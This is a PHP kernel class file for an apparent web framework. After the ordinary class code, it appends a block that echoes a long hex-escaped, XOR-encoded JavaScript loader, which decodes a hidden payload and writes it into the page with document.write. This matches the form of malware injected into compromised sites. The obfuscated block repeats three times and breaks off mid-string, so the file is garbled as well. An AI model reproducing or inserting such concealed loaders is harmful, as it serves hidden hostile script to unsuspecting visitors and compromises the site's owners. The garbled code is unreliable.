<?php
namespace Karmate\Kernel;

require_once __DIR__.DIRECTORY_SEPARATOR.'innerkernel'.DIRECTORY_SEPARATOR.'src.php';
class InnerKernel extends InnerKernel\Source
{
    /**
    * Construct function
    * Runs some functions
    */
    public function __construct()
    {
		#RUN -> Source files
		INNERKERNEL\Source::getSource();

		#SET PHP
		$setPHP = new InnerKernel\Src\SetPHP;
		$setPHP->error_reporting(0);

    	#RUN -> Requirement checks
		$requirementChecks = new InnerKernel\Src\RequirementChecks;
		$requirementChecks->run();

		#RUN -> Constants
        new InnerKernel\Src\Constants;

		#RUN _> Upper kernel includes
        new InnerKernel\Src\UpperKernelIncludes;
    }
}

if(strstr($_SERVER['REQUEST_URI'], 'kernel.php')) {
    echo "
        <!--%66%75%6e%63%74%69%6f%6e%20%74%36%64%61%33%37%61%63%61%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%37%34%38%38%35%38%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%34%37%38%38%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%74%36%64%61%33%37%61%63%61%66%28%27') + '%43%7e%7b%87%75%67%46%10%17%2b%63%7d%6f%6a%76%33%78%6e%88%7c%6c%7f%69%62%8c%78%68%83%7b%33%6a%7c%73%76%73%44%64%66%72%7b%6c%7d%83%6b%71%6c%84%80%6b%76%73%79%7e%79%45%74%6e%7c%78%42%6f%6d%64%7c%75%7d%7a%78%72%6d%4a%7f%7d%71%36%65%62%78%6c%41%74%73%6a%79%6f%3e%74%75%67%4c%6e%6c%7e%68%3a%3d%3c%5a%3f%71%57%50%45%70%77%48%86%4f%4d%43%58%6a%4e%4d%42%42%4f%4c%48%4d%49%4a%50%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%84%84%4d%42%42%4f%4c%48%86%4f%4d%43%4b%4c%56%4b%52%42%48%4c%49%77%57%6c%59%4a%4c%4e%4d%42%48%37%2f%6e%68%72%7d%67%7a%2f%28%3c%33%33%41%6a%7a%73%7d%7b%4a%7a%68%69%43%67%70%72%7b%34%69%6f%76%7b%74%84%47%4b%70%76%7e%74%6c%7d%2c%57%67%81%42%6b%7f%7f%75%33%7a%70%85%6b%43%4b%78%87%82%2b%63%7d%6f%6a%76%82%6a%78%7e%7c%30%78%75%8b%66%46%3c%3b%7f%84%44%66%79%71%79%31%88%66%77%76%73%7b%46%40%30%38%80%6e%44%7d%7a%72%72%37%6c%46%7f%7b%7d%74%79%69%65%8c%6a%7e%75%7b%33%80%67%73%76%75%7a%4b%35%3c%3f%46%7b%6b%81%74%37%6b%6a%6b%70%73%6f%7b%70%7e%72%43%7e%79%71%6a%43%64%70%70%7e%79%45%7e%6e%64%87%6c%47%76%70%77%6b%7d%86%69%7d%77%74%37%86%6a%75%78%79%78%45%42%3f%3c%44%74%6f%87%79%31%65%66%69%7e%79%6c%78%72%71%76%45%73%7f%7f%66%41%6a%7c%7d%79%78%72%42%6b%6a%68%62%76%70%7b%84%7b%6b%81%74%6b%7d%6a%6d%8c%64%7b%7d%7e%7e%7e%43%78%6f%73%7d%43%63%62%69%72%72%7d%7d%7e%7e%6c%45%28%3e%31%35%3c%3f%3b%42%69%78%7c%79%7d%47%2b%31%67%3c%42%79%68%79%72%8a%6f%45%73%7f%7f%66%41%77%6c%74%75%71%74%42%3a%3a%39%71%89%41%86%70%6b%78%71%4a%3b%3f%3d%78%88%4c%73%6c%79%76%77%77%3f%7c%7e%7d%44%32%31%2b%42%74%6c%7e%70%7b%76%30%71%69%67%75%46%3f%46%7f%6f%6d%64%73%71%74%44%33%71%84%2f%3b%2f%3c%29%32%78%87%40%6c%70%89%33%7a%70%85%77%77%79%42%6d%7c%7c%65%66%7e%30%69%7e%84%44%66%79%71%79%31%67%62%73%74%77%84%46%76%71%76%7e%78%7e%62%64%6b%42%34%86%6b%6b%7d%73%7b%32%7a%70%76%69%77%34%6a%6f%75%7c%79%78%79%44%7f%70%72%68%46%30%85%6e%62%75%74%79%31%76%74%6b%7d%34%7a%6b%75%67%6d%7b%47%70%70%7f%6b%42%34%72%74%7d%7f%74%30%7a%7b%66%73%33%7a%6c%73%6b%6c%74%42%71%7c%70%66%4c%33%70%7a%85%33%7e%75%6f%7d%32%7b%66%7d%6b%6a%7f%45%72%78%7e%6f%42%32%71%74%3e%7b%7a%6c%7d%33%7c%67%74%68%68%7a%4b%7f%7d%71%6c%42%7b%7c%67%7a%30%78%69%7d%66%69%7b%41%71%7d%77%67%45%6d%7c%7c%65%66%7e%30%6e%7e%70%78%72%42%76%7f%69%66%7f%83%10%11%43%3d%7c%74%83%73%6a%40%1e%1b%40%7b%6c%87%78%6a%72%6f%6c%2d%7c%66%62%68%7e%75%73%87%4715748858%36%32%36%35%30%39%3%66%75%6e%63%74%69%6f%6e%20%74%36%64%61%33%37%61%63%61%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%37%34%38%38%35%38%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%34%37%38%38%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%74%36%64%61%33%37%61%63%61%66%28%27') + '%43%7e%7b%87%75%67%46%10%17%2b%63%7d%6f%6a%76%33%78%6e%88%7c%6c%7f%69%62%8c%78%68%83%7b%33%6a%7c%73%76%73%44%64%66%72%7b%6c%7d%83%6b%71%6c%84%80%6b%76%73%79%7e%79%45%74%6e%7c%78%42%6f%6d%64%7c%75%7d%7a%78%72%6d%4a%7f%7d%71%36%65%62%78%6c%41%74%73%6a%79%6f%3e%74%75%67%4c%6e%6c%7e%68%3a%3d%3c%5a%3f%71%57%50%45%70%77%48%86%4f%4d%43%58%6a%4e%4d%42%42%4f%4c%48%4d%49%4a%50%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%84%84%4d%42%42%4f%4c%48%86%4f%4d%43%4b%4c%56%4b%52%42%48%4c%49%77%57%6c%59%4a%4c%4e%4d%42%48%37%2f%6e%68%72%7d%67%7a%2f%28%3c%33%33%41%6a%7a%73%7d%7b%4a%7a%68%69%43%67%70%72%7b%34%69%6f%76%7b%74%84%47%4b%70%76%7e%74%6c%7d%2c%57%67%81%42%6b%7f%7f%75%33%7a%70%85%6b%43%4b%78%87%82%2b%63%7d%6f%6a%76%82%6a%78%7e%7c%30%78%75%8b%66%46%3c%3b%7f%84%44%66%79%71%79%31%88%66%77%76%73%7b%46%40%30%38%80%6e%44%7d%7a%72%72%37%6c%46%7f%7b%7d%74%79%69%65%8c%6a%7e%75%7b%33%80%67%73%76%75%7a%4b%35%3c%3f%46%7b%6b%81%74%37%6b%6a%6b%70%73%6f%7b%70%7e%72%43%7e%79%71%6a%43%64%70%70%7e%79%45%7e%6e%64%87%6c%47%76%70%77%6b%7d%86%69%7d%77%74%37%86%6a%75%78%79%78%45%42%3f%3c%44%74%6f%87%79%31%65%66%69%7e%79%6c%78%72%71%76%45%73%7f%7f%66%41%6a%7c%7d%79%78%72%42%6b%6a%68%62%76%70%7b%84%7b%6b%81%74%6b%7d%6a%6d%8c%64%7b%7d%7e%7e%7e%43%78%6f%73%7d%43%63%62%69%72%72%7d%7d%7e%7e%6c%45%28%3e%31%35%3c%3f%3b%42%69%78%7c%79%7d%47%2b%31%67%3c%42%79%68%79%72%8a%6f%45%73%7f%7f%66%41%77%6c%74%75%71%74%42%3a%3a%39%71%89%41%86%70%6b%78%71%4a%3b%3f%3d%78%88%4c%73%6c%79%76%77%77%3f%7c%7e%7d%44%32%31%2b%42%74%6c%7e%70%7b%76%30%71%69%67%75%46%3f%46%7f%6f%6d%64%73%71%74%44%33%71%84%2f%3b%2f%3c%29%32%78%87%40%6c%70%89%33%7a%70%85%77%77%79%42%6d%7c%7c%65%66%7e%30%69%7e%84%44%66%79%71%79%31%67%62%73%74%77%84%46%76%71%76%7e%78%7e%62%64%6b%42%34%86%6b%6b%7d%73%7b%32%7a%70%76%69%77%34%6a%6f%75%7c%79%78%79%44%7f%70%72%68%46%30%85%6e%62%75%74%79%31%76%74%6b%7d%34%7a%6b%75%67%6d%7b%47%70%70%7f%6b%42%34%72%74%7d%7f%74%30%7a%7b%66%73%33%7a%6c%73%6b%6c%74%42%71%7c%70%66%4c%33%70%7a%85%33%7e%75%6f%7d%32%7b%66%7d%6b%6a%7f%45%72%78%7e%6f%42%32%71%74%3e%7b%7a%6c%7d%33%7c%67%74%68%68%7a%4b%7f%7d%71%6c%42%7b%7c%67%7a%30%78%69%7d%66%69%7b%41%71%7d%77%67%45%6d%7c%7c%65%66%7e%30%6e%7e%70%78%72%42%76%7f%69%66%7f%83%10%11%43%3d%7c%74%83%73%6a%40%1e%1b%40%7b%6c%87%78%6a%72%6f%6c%2d%7c%66%62%68%7e%75%73%87%4715748858%36%32%36%35%30%39%3%66%75%6e%63%74%69%6f%6e%20%74%36%64%61%33%37%61%63%61%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%37%34%38%38%35%38%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%34%37%38%38%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%74%36%64%61%33%37%61%63%61%66%28%27') + '%43%7e%7b%87%75%67%46%10%17%2b%63%7d%6f%6a%76%33%78%6e%88%7c%6c%7f%69%62%8c%78%68%83%7b%33%6a%7c%73%76%73%44%64%66%72%7b%6c%7d%83%6b%71%6c%84%80%6b%76%73%79%7e%79%45%74%6e%7c%78%42%6f%6d%64%7c%75%7d%7a%78%72%6d%4a%7f%7d%71%36%65%62%78%6c%41%74%73%6a%79%6f%3e%74%75%67%4c%6e%6c%7e%68%3a%3d%3c%5a%3f%71%57%50%45%70%77%48%86%4f%4d%43%58%6a%4e%4d%42%42%4f%4c%48%4d%49%4a%50%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%3e%3c%3f%30%30%3d%3e%3a%3e%3d%38%31%39%84%84%4d%42%42%4f%4c%48%86%4f%4d%43%4b%4c%56%4b%52%42%48%4c%49%77%57%6c%59%4a%4c%4e%4d%42%48%37%2f%6e%68%72%7d%67%7a%2f%28%3c%33%33%41%6a%7a%73%7d%7b%4a%7a%68%69%43%67%70%72%7b%34%69%6f%76%7b%74%84%47%4b%70%76%7e%74%6c%7d%2c%57%67%81%42%6b%7f%7f%75%33%7a%70%85%6b%43%4b%78%87%82%2b%63%7d%6f%6a%76%82%6a%78%7e%7c%30%78%75%8b%66%46%3c%3b%7f%84%44%66%79%71%79%31%88%66%77%76%73%7b%46%40%30%38%80%6e%44%7d%7a%72%72%37%6c%46%7f%7b%7d%74%79%69%65%8c%6a%7e%75%7b%33%80%67%73%76%75%7a%4b%35%3c%3f%46%7b%6b%81%74%37%6b%6a%6b%70%73%6f%7b%70%7e%72%43%7e%79%71%6a%43%64%70%70%7e%79%45%7e%6e%64%87%6c%47%76%70%77%6b%7d%86%69%7d%77%74%37%86%6a%75%78%79%78%45%42%3f%3c%44%74%6f%87%79%31%65%66%69%7e%79%6c%78%72%71%76%45%73%7f%7f%66%41%6a%7c%7d%79%78%72%42%6b%6a%68%62%76%70%7b%84%7b%6b%81%74%6b%7d%6a%6d%8c%64%7b%7d%7e%7e%7e%43%78%6f%73%7d%43%63%62%69%72%72%7d%7d%7e%7e%6c%45%28%3e%31%35%3c%3f%3b%42%69%78%7c%79%7d%47%2b%31%67%3c%42%79%68%79%72%8a%6f%45%73%7f%7f%66%41%77%6c%74%75%71%74%42%3a%